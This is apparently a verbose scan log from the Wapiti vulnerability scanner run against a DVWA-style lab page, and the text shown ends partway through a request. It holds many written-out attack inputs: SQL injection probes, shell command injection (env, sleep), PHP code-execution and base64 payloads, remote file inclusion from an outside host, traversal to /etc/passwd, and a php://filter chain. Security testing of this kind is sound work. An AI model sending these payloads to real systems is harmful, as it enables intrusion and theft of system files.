2024-03-20 12:47:09.119 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
2024-03-20 12:47:09.218 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
2024-03-20 12:47:09.219 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/vulnerabilities/xss_r/ (1)
2024-03-20 12:47:09.331 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
2024-03-20 12:47:09.331 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_59964006.db
2024-03-20 12:47:09.334 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 3 URLs and forms during the scan
2024-03-20 12:47:09.365 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
2024-03-20 12:47:09.365 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
2024-03-20 12:47:09.445 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
2024-03-20 12:47:09.473 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
2024-03-20 12:47:09.474 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
2024-03-20 12:47:09.489 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
2024-03-20 12:47:09.490 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
2024-03-20 12:47:09.490 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
2024-03-20 12:47:09.542 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
2024-03-20 12:47:09.619 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
2024-03-20 12:47:09.632 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
2024-03-20 12:47:09.632 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%C2%BF%27%22%28 (0)
2024-03-20 12:47:09.659 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%20AND%2029%3D122%20AND%2083%3D83 (0)
2024-03-20 12:47:09.674 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%20AND%2054%3D77%20AND%2037%3D37 (0)
2024-03-20 12:47:09.693 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%20AND%2029%3D29%20AND%2026%3D26 (0)
2024-03-20 12:47:09.711 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%27%20AND%2096%3D159%20AND%20%2789%27%3D%2789 (0)
2024-03-20 12:47:09.731 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%27%20AND%2055%3D86%20AND%20%2775%27%3D%2775 (0)
2024-03-20 12:47:09.750 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%27%20AND%2039%3D39%20AND%20%2729%27%3D%2729 (0)
2024-03-20 12:47:09.764 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%22%20AND%2088%3D179%20AND%20%2270%22%3D%2270 (0)
2024-03-20 12:47:09.780 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%22%20AND%2067%3D96%20AND%20%2248%22%3D%2248 (0)
2024-03-20 12:47:09.796 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%22%20AND%2024%3D24%20AND%20%2280%22%3D%2280 (0)
2024-03-20 12:47:09.816 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%29%20AND%2036%3D103%20AND%20%2848%3D48 (0)
2024-03-20 12:47:09.834 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%29%20AND%2080%3D135%20AND%20%2833%3D33 (0)
2024-03-20 12:47:09.850 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%29%20AND%2021%3D21%20AND%20%2894%3D94 (0)
2024-03-20 12:47:09.869 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%27%29%20AND%2078%3D168%20AND%20%28%2717%27%3D%2717 (0)
2024-03-20 12:47:09.887 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%27%29%20AND%2078%3D168%20AND%20%28%2726%27%3D%2726 (0)
2024-03-20 12:47:09.902 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%27%29%20AND%2040%3D40%20AND%20%28%2719%27%3D%2719 (0)
2024-03-20 12:47:09.919 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%22%29%20AND%2097%3D137%20AND%20%28%2278%22%3D%2278 (0)
2024-03-20 12:47:09.934 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%22%29%20AND%2078%3D116%20AND%20%28%2233%22%3D%2233 (0)
2024-03-20 12:47:09.952 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%22%29%20AND%2097%3D97%20AND%20%28%2233%22%3D%2233 (0)
2024-03-20 12:47:09.978 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
2024-03-20 12:47:09.991 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%20AND%2044%3D90%20AND%2040%3D40 (1)
2024-03-20 12:47:10.006 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%20AND%2018%3D29%20AND%2035%3D35 (1)
2024-03-20 12:47:10.024 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%20AND%2096%3D96%20AND%2074%3D74 (1)
2024-03-20 12:47:10.043 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%27%20AND%2011%3D101%20AND%20%2757%27%3D%2757 (1)
2024-03-20 12:47:10.057 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%27%20AND%2082%3D178%20AND%20%2738%27%3D%2738 (1)
2024-03-20 12:47:10.075 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%27%20AND%2088%3D88%20AND%20%2759%27%3D%2759 (1)
2024-03-20 12:47:10.090 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%22%20AND%2031%3D121%20AND%20%2283%22%3D%2283 (1)
2024-03-20 12:47:10.110 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%22%20AND%2023%3D114%20AND%20%2269%22%3D%2269 (1)
2024-03-20 12:47:10.128 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%22%20AND%2031%3D31%20AND%20%2284%22%3D%2284 (1)
2024-03-20 12:47:10.149 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%29%20AND%2032%3D106%20AND%20%2864%3D64 (1)
2024-03-20 12:47:10.168 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%29%20AND%2032%3D103%20AND%20%2833%3D33 (1)
2024-03-20 12:47:10.187 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%29%20AND%2058%3D58%20AND%20%2815%3D15 (1)
2024-03-20 12:47:10.206 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%27%29%20AND%2048%3D83%20AND%20%28%2750%27%3D%2750 (1)
2024-03-20 12:47:10.229 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%27%29%20AND%2067%3D93%20AND%20%28%2779%27%3D%2779 (1)
2024-03-20 12:47:10.245 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%27%29%20AND%2076%3D76%20AND%20%28%2771%27%3D%2771 (1)
2024-03-20 12:47:10.261 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%22%29%20AND%2086%3D128%20AND%20%28%2292%22%3D%2292 (1)
2024-03-20 12:47:10.275 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%22%29%20AND%2069%3D103%20AND%20%28%2210%22%3D%2210 (1)
2024-03-20 12:47:10.291 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%22%29%20AND%2098%3D98%20AND%20%28%2236%22%3D%2236 (1)
2024-03-20 12:47:10.314 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/ (1)
2024-03-20 12:47:10.342 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
2024-03-20 12:47:10.378 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
2024-03-20 12:47:10.392 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
2024-03-20 12:47:10.395 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%3Benv%3B (0)
2024-03-20 12:47:10.410 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%7Cenv%7C (0)
2024-03-20 12:47:10.423 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%3Benv%3B (0)
2024-03-20 12:47:10.433 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%3Benv%3B (0)
2024-03-20 12:47:10.443 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C (0)
2024-03-20 12:47:10.452 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%3Benv%3B (0)
2024-03-20 12:47:10.463 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%0Aenv%3B (0)
2024-03-20 12:47:10.471 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%26set%26 (0)
2024-03-20 12:47:10.480 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=set (0)
2024-03-20 12:47:10.489 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=env (0)
2024-03-20 12:47:10.497 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%2Fe%00 (0)
2024-03-20 12:47:10.507 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 12:47:10.515 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 12:47:10.524 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 12:47:10.532 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 12:47:10.542 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 12:47:10.550 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 12:47:10.559 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 12:47:10.567 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 12:47:10.576 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 12:47:10.584 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 12:47:10.592 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (0)
2024-03-20 12:47:10.600 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (0)
2024-03-20 12:47:10.610 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (0)
2024-03-20 12:47:10.618 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%60%29%60 (0)
2024-03-20 12:47:10.627 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%60sleep%2060%60 (0)
2024-03-20 12:47:10.635 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%3Bsleep%2060%3B (0)
2024-03-20 12:47:10.644 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=a%7Csleep%2060%3B (0)
2024-03-20 12:47:10.653 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/vulnerabilities/xss_r/?name=%26ping%20-n%2025%20127.0.0.1%26 (0)
2024-03-20 12:47:10.668 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
2024-03-20 12:47:10.676 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/ (1)
2024-03-20 12:47:10.701 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
2024-03-20 12:47:10.714 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
2024-03-20 12:47:10.716 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
2024-03-20 12:47:10.727 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
2024-03-20 12:47:10.738 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=%2Fetc%2Fpasswd (0)
2024-03-20 12:47:10.749 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=%2Fetc%2Fpasswd%00 (0)
2024-03-20 12:47:10.760 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=%2Fetc%2Fservices (0)
2024-03-20 12:47:10.769 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:10.780 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-20 12:47:10.790 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
2024-03-20 12:47:10.799 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
2024-03-20 12:47:10.809 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:47:10.819 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:10.828 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
2024-03-20 12:47:10.837 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
2024-03-20 12:47:10.851 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
2024-03-20 12:47:10.862 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 12:47:10.875 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-20 12:47:10.884 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 12:47:10.895 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-20 12:47:10.906 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 12:47:10.916 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-20 12:47:10.926 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:10.935 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:10.946 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:47:10.955 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-20 12:47:10.967 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:10.976 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-20 12:47:10.985 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE